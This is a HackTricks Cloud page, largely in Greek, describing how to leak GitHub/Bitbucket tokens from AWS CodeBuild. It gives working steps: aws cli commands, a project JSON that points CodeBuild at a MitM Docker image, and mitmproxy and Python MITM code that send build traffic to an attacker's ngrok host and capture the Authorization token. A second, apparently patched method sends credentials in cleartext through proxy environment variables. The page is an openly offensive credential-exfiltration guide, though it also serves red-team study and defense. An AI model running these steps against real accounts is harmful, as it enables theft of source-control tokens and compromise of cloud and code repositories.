# AWS Codebuild - Token Leakage

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Ανάκτηση Ρυθμίσεων Tokens από Github/Bitbucket

Πρώτα, ελέγξτε αν υπάρχουν διαπιστευτήρια πηγής που έχουν ρυθμιστεί και θα μπορούσατε να διαρρεύσετε:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Αν διαπιστώσετε ότι η αυθεντικοποίηση για παράδειγμα στο Github είναι ρυθμισμένη στον λογαριασμό, μπορείτε να **exfiltrate** αυτήν την **access** (**GH token ή OAuth token**) κάνοντάς το Codebuild να **χρησιμοποιήσει μια συγκεκριμένη εικόνα docker** για να εκτελέσει την κατασκευή του έργου.

Για αυτόν τον σκοπό μπορείτε να **δημιουργήσετε ένα νέο έργο Codebuild** ή να αλλάξετε το **περιβάλλον** ενός υπάρχοντος για να ρυθμίσετε την **εικόνα Docker**.

Η εικόνα Docker που μπορείτε να χρησιμοποιήσετε είναι [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Αυτή είναι μια πολύ βασική εικόνα Docker που θα ρυθμίσει τις **env μεταβλητές `https_proxy`**, **`http_proxy`** και **`SSL_CERT_FILE`**. Αυτό θα σας επιτρέψει να παγιδεύσετε το μεγαλύτερο μέρος της κίνησης του host που υποδεικνύεται στο **`https_proxy`** και **`http_proxy`** και να εμπιστευτείτε το SSL CERT που υποδεικνύεται στο **`SSL_CERT_FILE`**.

1. **Create & Upload your own Docker MitM image**
* Ακολουθήστε τις οδηγίες του repo για να ρυθμίσετε τη διεύθυνση IP του proxy σας και να ρυθμίσετε το SSL cert και **build the docker image**.
* **DO NOT SET `http_proxy`** για να μην παγιδεύσετε αιτήματα προς το metadata endpoint.
* Μπορείτε να χρησιμοποιήσετε **`ngrok`** όπως `ngrok tcp 4444` για να ρυθμίσετε το proxy στον host σας.
* Μόλις έχετε κατασκευάσει την εικόνα Docker, **upload it to a public repo** (Dockerhub, ECR...)
2. **Set the environment**
* Δημιουργήστε ένα **νέο έργο Codebuild** ή **τροποποιήστε** το περιβάλλον ενός υπάρχοντος.
* Ρυθμίστε το έργο να χρησιμοποιεί την **προηγουμένως παραγόμενη εικόνα Docker**.

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

* Όπως υποδεικνύεται στο **Github repo**, μπορείτε να χρησιμοποιήσετε κάτι σαν:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
Η **έκδοση mitmproxy που χρησιμοποιήθηκε ήταν 9.0.1**, αναφέρθηκε ότι με την έκδοση 10 αυτό μπορεί να μην λειτουργήσει.
{% endhint %}

4. **Εκτέλεση της κατασκευής & καταγραφή των διαπιστευτηρίων**

*   Μπορείτε να δείτε το token στην κεφαλίδα **Authorization**:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Αυτό θα μπορούσε επίσης να γίνει από το aws cli με κάτι σαν

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
{% endcode %}

### ~~Μέσω του πρωτοκόλλου HTTP~~

{% hint style="success" %}
**Αυτή η ευπάθεια διορθώθηκε από την AWS κάποια στιγμή την εβδομάδα της 20ης Φεβρουαρίου 2023 (νομίζω την Παρασκευή). Έτσι, ένας επιτιθέμενος δεν μπορεί να την εκμεταλλευτεί πια :)**
{% endhint %}

Ένας επιτιθέμενος με **υψηλά δικαιώματα σε ένα CodeBuild θα μπορούσε να διαρρεύσει το Github/Bitbucket token** που έχει ρυθμιστεί ή αν τα δικαιώματα έχουν ρυθμιστεί μέσω OAuth, το ** προσωρινό OAuth token που χρησιμοποιείται για την πρόσβαση στον κώδικα**.

* Ένας επιτιθέμενος θα μπορούσε να προσθέσει τις μεταβλητές περιβάλλοντος **http\_proxy** και **https\_proxy** στο έργο CodeBuild που να δείχνουν στη μηχανή του (για παράδειγμα `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Στη συνέχεια, αλλάξτε τη διεύθυνση URL του αποθετηρίου github για να χρησιμοποιεί HTTP αντί για HTTPS, για παράδειγμα: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* Στη συνέχεια, εκτελέστε το βασικό παράδειγμα από [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) στην πόρτα που υποδεικνύεται από τις μεταβλητές proxy (http\_proxy και https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Τέλος, κάντε κλικ στο **Build the project**, τα **credentials** θα σταλούν σε **καθαρό κείμενο** (base64) στην θύρα mitm:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Τώρα ένας επιτιθέμενος θα μπορεί να χρησιμοποιήσει το token από τον υπολογιστή του, να καταγράψει όλα τα δικαιώματα που έχει και να (κατα)χρησιμοποιήσει πιο εύκολα από το να χρησιμοποιήσει απευθείας την υπηρεσία CodeBuild.
{% endhint %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
